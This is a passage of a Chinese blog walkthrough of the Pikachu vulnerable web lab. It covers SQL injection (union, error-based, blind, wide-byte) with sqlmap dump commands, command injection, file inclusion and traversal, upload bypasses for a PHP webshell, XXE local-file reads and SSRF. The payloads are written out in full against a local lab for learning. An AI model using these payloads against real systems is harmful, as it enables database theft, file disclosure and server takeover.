class="line">123</span><br><span class="line">#正常</span><br><span class="line"></span><br><span class="line">123&#x27;</span><br><span class="line">#发现报错</span><br><span class="line"></span><br><span class="line">123&#x27;&#x27;</span><br><span class="line">#又是正常了，基本上判定为字符型注入</span><br><span class="line"></span><br><span class="line">123&#x27; or 1=1 #</span><br><span class="line">#爆出所有用户</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//附</span><br><span class="line"></span><br><span class="line">123&#x27; union select database(),2 #</span><br><span class="line">#查询数据库名称</span><br><span class="line"></span><br><span class="line">123&#x27; union select table_schema,table_name from information_schema.tables where table_schema=&quot;pikachu&quot; #</span><br><span class="line">#查询表，发现有个users项</span><br><span class="line"></span><br><span class="line">123&#x27; union select table_name,column_name from information_schema.columns where table_name=&quot;users&quot; #</span><br><span class="line">#查询uesrs表中的内容，发现存在username和password项</span><br><span class="line"></span><br><span class="line">123&#x27; union select username,password from users #</span><br><span class="line">#查出信息，但是密码是经过md5加密的，解密一下就行</span><br></pre></td></tr></table></figure>
+<p><strong>sqlmap</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://127.0.0.1/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> -D pikachu -T member --batch --dump</span><br></pre></td></tr></table></figure>
+<h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>由于没有过滤“%”，“%”可以进行匹配任意字符，与linux中的”*“类似</p>
+<p><strong>sqlmap</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://127.0.0.1/vul/sqli/sqli_search.php?name=1&amp;submit=%E6%90%9C%E7%B4%A2&quot;</span> --batch -D pikachu -T member --dump</span><br></pre></td></tr></table></figure>
+<h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><p>用123‘测试发现报错中含有一个反括号，</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/0b40919a80ae498d9815e4457a5965b4" alt="xx型注入1"></p>
+<p>那就构造以下payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#x27;) or 1=1 #</span><br></pre></td></tr></table></figure>
+<p><strong>sqlmap</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1/vul/sqli/sqli_x.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --batch -D pikachu -T member --dump</span><br></pre></td></tr></table></figure>
+<h3 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h3><p>注册一下账户，然后brup抓包，随便选一个变量，修改如下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/fe555fea57e745c9b9428ea38bb4a2dd" alt="报错注入1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and extractvalue(1,concat(&#x27;~&#x27;,(select database()))) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 报错注入两个典型的函数</span><br><span class="line">extractvalue()		是mysql对xml文档数据进行查询和修改的xpath函数</span><br><span class="line">updatexml()			是mysql对xml文档数据进行查询的xpath函数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h3><p>操作同上，在点击删除留言时进行抓包，发现有一个id参数可以进行注入，不过发现注入的参数中不能出现空格，否则空格后面不会进行处理</p>
+<p>可以用“+”代替空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+and+updatexml(1,concat(0x7e,database(),0x7e),1)</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/0af26ca25cc440cd87e1683bc22e3942" alt="报错注入2"></p>
+<h3 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/4f4d58643a944fefa047f5119908366c" alt="http_header注入"></p>
+<p>用提示给的用户登陆以下发现显示以上信息</p>
+<p>直接抓包，然后修改User-Agent或者Accept，</p>
+<p>修改如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; and extractvalue(1,concat(0x7e,(database()))) and &#x27;1&#x27;=&#x27;1</span><br><span class="line">或</span><br><span class="line">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+<p>经测试，cookie中的uname和pw变量也能进行注入</p>
+<h3 id="盲注（base-on-boolean）"><a href="#盲注（base-on-boolean）" class="headerlink" title="盲注（base on boolean）"></a>盲注（base on boolean）</h3><p>当输入kobe时显示uid和email</p>
+<p>当输入其他的值后显示输入的username不存在</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/41d6aa8e61624862b3dc0e6f830adf3e" alt="boolean盲注1"></p>
+<p>经测试是用 <strong>‘</strong> 进行闭合的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27;</span><br><span class="line"># 未查到username信息</span><br><span class="line"></span><br><span class="line">kobe&#x27;and &#x27;1&#x27;=&#x27;1</span><br><span class="line">#可以查到，判定用&#x27;闭合</span><br><span class="line"></span><br><span class="line">kobe&#x27;and length(database())=n#</span><br><span class="line"># &quot;n&quot;为一个数字，此处为了判定数据库字符的长度，经测试，当n=7时，正常显示，即可判定数据库名字长度为7</span><br></pre></td></tr></table></figure>
+<p>burp抓包进行爆破数据库名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobe&#x27; and substr(database(),1,1)=&#x27;a&#x27;#</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/98bc46e26cd34842a309e03383a136ba" alt="boolean盲注2"></p>
+<p>第一个参数修改</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/e4c7a656d5df4108aefea632dbd20f7a" alt="boolean盲注3"></p>
+<p>第二个参数修改，爆破字符为a-z ，顺带着添加一个”_”</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/77a6c71a8e894d339f3afd1ad959468f" alt="boolean盲注4"></p>
+<p><strong>sqlmap</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://127.0.0.1/vul/sqli/sqli_blind_b.php?name=123&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --batch</span><br></pre></td></tr></table></figure>
+<p>然后稍微排下序即可爆出数据库名字</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/d7935e52aaaf4a2c8b63c0db5a262dfc" alt="boolean盲注5"></p>
+<h3 id="盲注（base-on-time）"><a href="#盲注（base-on-time）" class="headerlink" title="盲注（base on time）"></a>盲注（base on time）</h3><p>增加一个sleep(n)函数，加个判断，用回显时间的长短来判断，剩下的操作和上一样</p>
+<p><strong>sqlmap</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://127.0.0.1/vul/sqli/sqli_blind_t.php?name=123&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span> --batch</span><br></pre></td></tr></table></figure>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>引用大佬的链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/aa2528877987/article/details/118569895">https://blog.csdn.net/aa2528877987/article/details/118569895</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">宽字节注入原理：</span><br><span class="line"></span><br><span class="line">　　GBK 占用两字节</span><br><span class="line"></span><br><span class="line">　　ASCII占用一字节</span><br><span class="line"></span><br><span class="line">　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。</span><br><span class="line"></span><br><span class="line">　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。</span><br><span class="line"></span><br><span class="line">　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\&#x27;” ，“\”既URL里的“%5C”，那么也就是说，“%DF&#x27;”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”</span><br><span class="line"></span><br><span class="line">例如：http://www.xxx.com/login.php?user=%df’ or 1=1 limit 1,1%23&amp;pass=</span><br><span class="line"></span><br><span class="line">其对应的sql就是：</span><br><span class="line"></span><br><span class="line">select * fromcms_user where username = ‘運’ or 1=1 limit 1,1#’ and password=”</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在’前面加个%df也就可以实现逃逸转义，然后burp抓包，剩下操作同上</p>
+<h2 id="0x06-RCE"><a href="#0x06-RCE" class="headerlink" title="0x06 RCE"></a>0x06 RCE</h2><h3 id="exec”ping”"><a href="#exec”ping”" class="headerlink" title="exec”ping”"></a>exec”ping”</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;dir</span><br><span class="line">#执行完ping指令后同时执行dir指令</span><br></pre></td></tr></table></figure>
+<h3 id="exec”eval”"><a href="#exec”eval”" class="headerlink" title="exec”eval”"></a>exec”eval”</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">直接输入 phpinfo();</span><br></pre></td></tr></table></figure>
+<p>经过查看源码发现代码如下</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/926ff3d7ff244063a72151fdfa320164" alt="rce1"></p>
+<p>于是尝试用蚁剑进行连接，最后发现修改如下可以成功连接</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/7c167c375da14a80b7fabd5de25c8c3c" alt="rce2"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/bfbd21abb81c490c90604445e925dbb5" alt="rce3"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/b6aa7e06167d42bdad304479a1dee4d2" alt="rce4"></p>
+<h2 id="0x07-File-Inclusion"><a href="#0x07-File-Inclusion" class="headerlink" title="0x07 File Inclusion"></a>0x07 File Inclusion</h2><h3 id="file-inclusion-local"><a href="#file-inclusion-local" class="headerlink" title="file inclusion(local)"></a>file inclusion(local)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">..\..\..\Users\sfd\Desktop\demo.txt</span><br><span class="line">#直接访问电脑桌面的文件</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/6913ded72a084cd498cbccb2d9326e5d" alt="file_inclusion"></p>
+<h3 id="file-inclusion-remote"><a href="#file-inclusion-remote" class="headerlink" title="file inclusion(remote)"></a>file inclusion(remote)</h3><p>同标题，还是相同的位置，可以通过输入链接进行访问其他东西</p>
+<h2 id="0x08-Unsafe-file-download"><a href="#0x08-Unsafe-file-download" class="headerlink" title="0x08 Unsafe file download"></a>0x08 Unsafe file download</h2><h3 id="Unsafe-file-download"><a href="#Unsafe-file-download" class="headerlink" title="Unsafe file download"></a>Unsafe file download</h3><p>当鼠标悬浮在要下载的文件上时，发现左下角有详细链接</p>
+<p>那么我们可以修改这个链接指向的filename来进行下载任意文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/fbb7680a5a144f76bd1411647a0d5311" alt="不安全的文件下载1"></p>
+<p>要下载本地文件用法和<a href="#File Inclusion(local">File Inclusion(loacl)</a>)一样，直接在filename=后面添加想要下载文件的相对位置</p>
+<h2 id="0x09-unsafe-upfileupload"><a href="#0x09-unsafe-upfileupload" class="headerlink" title="0x09 [unsafe upfileupload]"></a>0x09 [unsafe upfileupload]</h2><h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>先上传一张图片，然后burp抓包，修改后缀后放包即可</p>
+<video src="https://s1.vika.cn/space/2023/08/12/e015a24794d749579f3c69d42fe13977"></video>
+
+<p>最后用蚁剑连接即可。</p>
+<h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>直接上传php木马，同样抓包，然后修改Content-Type 为 image/png 即可</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/0df49d200af8493ba3a38fad75d4756f" alt="MIME_type1"></p>
+<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>添加了对文件进行判断有没有图片特征的函数，直接用cmd命令合成一个图片码即可绕过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy /b a.png + a.php b.png</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/735f4d62e1bf4d738bab5a37f5b2b516" alt="getimagesize1"></p>
+<h2 id="0x10-over-permission"><a href="#0x10-over-permission" class="headerlink" title="0x10 over permission"></a>0x10 over permission</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>首先以lucy的身份进行登录，然后可以看到lucy的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure>
+<p>这时我们直接修改url里的username，将其指定为kobe,就可以直接查看kobe的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/vul/overpermission/op1/op1_mem.php?username=kobe&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF</span><br></pre></td></tr></table></figure>
+<h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>pikachu用户只有查看权限，而admin用户有所有权限</p>
+<p>首先登陆admin并添加用户，然后可以获得一个url地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/vul/overpermission/op2/op2_admin_edit.php</span><br></pre></td></tr></table></figure>
+<p>然后我们用pikachu用户登陆，然后直接输入上面的地址，发现可以进入添加用户界面，并且可以正常添加用户，回到admin用户后发现可以看到当前创建的用户</p>
+<h2 id="0x11-目录遍历"><a href="#0x11-目录遍历" class="headerlink" title="0x11 ../../(目录遍历)"></a>0x11 ../../(目录遍历)</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../../../../Users/sfd/Desktop/demo.txt</span><br><span class="line">#访问桌面的一个demo.txt 文件</span><br></pre></td></tr></table></figure>
+<h2 id="0x12-敏感信息泄露"><a href="#0x12-敏感信息泄露" class="headerlink" title="0x12 敏感信息泄露"></a>0x12 敏感信息泄露</h2><h3 id="icanyourABC"><a href="#icanyourABC" class="headerlink" title="icanyourABC"></a>icanyourABC</h3><p>F12进行元素审查时发现一个测试用户可以使用</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s1.vika.cn/space/2023/08/12/f71e82366b5d4a41bbcc9987ace4a02f" alt="敏感信息泄露1"></p>
+<h2 id="0x13-php反序列化"><a href="#0x13-php反序列化" class="headerlink" title="0x13 php反序列化"></a>0x13 php反序列化</h2><h3 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h3><p>php涉及到序列化的函数有两个，分别是serialize()<code>和</code>unserialize()</p>
+<p>序列化简单来说就是将一个<strong>对象</strong>转化成可以传输的<strong>字符串</strong>，反序列化就是相反的操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#举个例子</span><br><span class="line">class S&#123;</span><br><span class="line">        public $test=&quot;pikachu&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $s=new S(); //创建一个对象</span><br><span class="line">    serialize($s); //把这个对象进行序列化</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    序列化后得到的结果是这个样子的 O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">  	    O:代表object</span><br><span class="line">        1:代表对象名字长度为一个字符</span><br><span class="line">        S:对象的名称</span><br><span class="line">        1:代表对象里面有一个变量</span><br><span class="line">        s:数据类型</span><br><span class="line">        4:变量名称的长度</span><br><span class="line">        test:变量名称</span><br><span class="line">        s:数据类型</span><br><span class="line">        7:变量值的长度</span><br><span class="line">        pikachu:变量值</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">    echo $u-&gt;test; //得到的结果为pikachu</span><br></pre></td></tr></table></figure>
+<p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">	<span class="title function_ invoke__">__construct</span>()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">__destruct</span>()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">__toString</span>()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">	<span class="title function_ invoke__">__sleep</span>() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">	__wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">漏洞举例:</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">		<span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">	@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	payload:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="0x14-XXE"><a href="#0x14-XXE" class="headerlink" title="0x14 XXE"></a>0x14 XXE</h2><h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><p>前端将<code>$_POST[&#39;xml&#39;]</code>传递给变量<code>$xml,</code> 由于后台没有对此变量进行安全判断就直接使用<code>simplexml_load_string</code>函数进行xml解析, 从而导致xxe漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 打印hello world --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY test &quot;hello world&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;test;&lt;/name&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- 读取D盘根目录下的a.txt --&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY[  </span><br><span class="line">	&lt;!ENTITY f SYSTEM &quot;file:///D:/a.txt&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x15-URL重定向"><a href="#0x15-URL重定向" class="headerlink" title="0x15 URL重定向"></a>0x15 URL重定向</h2><h3 id="不安全的url跳转"><a href="#不安全的url跳转" class="headerlink" title="不安全的url跳转"></a>不安全的url跳转</h3><p>修改url=后面的参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/vul/urlredirect/urlredirect.php?url=https://baidu.com</span><br></pre></td></tr></table></figure>
+<h2 id="0x16-SSRF"><a href="#0x16-SSRF" class="headerlink" title="0x16 SSRF"></a>0x16 SSRF</h2><ul>
+<li>curl 支持更多协议，有http、https、ftp、gopher、telnet、dict、file、ldap；模拟 Cookie 登录，爬取网页；FTP 上传下载。</li>
+<li>fopen / file_get_contents 只能使用 GET 方式获取数据</li>
+</ul>
+<p>SSRF漏洞常用协议：</p>
+<h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><p>通过url参数直接访问内部资源，或者跳转到其他服务器页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP(s):最常用到的一种协议，可以用来验证是否存在SSRF漏洞，探测端口以及服务。</span><br><span class="line">file：本地文件传输协议，可以用来读取任意系统文件</span><br><span class="line">dict:字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628。在SSRF漏洞中可用于探测端口以及攻击内网应用</span><br><span class="line">ghoper:互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。可用于攻击内网应用，可用于反弹shell。</span><br></pre></td></tr></table></figure>
+<p>例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//访问内网链接资源</span><br><span class="line">http://127.0.0.1/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info2.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//读取D盘根目录a.txt</span><br><span class="line">http://127.0.0.1/vul/ssrf/ssrf_curl.php?url=file:///D:/a.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//用dict扫描内网主机开放的端口，端口存在时显示不同的信息</span><br><span class="line">dict://192.168.1.66:80</span><br></pre></td></tr></table></figure>
+<h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><p>利用file_get_content(“path”)利用传递的参数，通过file参数访问内部资源，或者跳转到其他服务器页面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//直接读取内部文件</span><br><span class="line">http://127.0.0.1/vul/ssrf/ssrf_fgc.php?file=D:/a.txt</span><br></pre></td></tr></table></figure>
+<p>php伪协议读取文件</p>
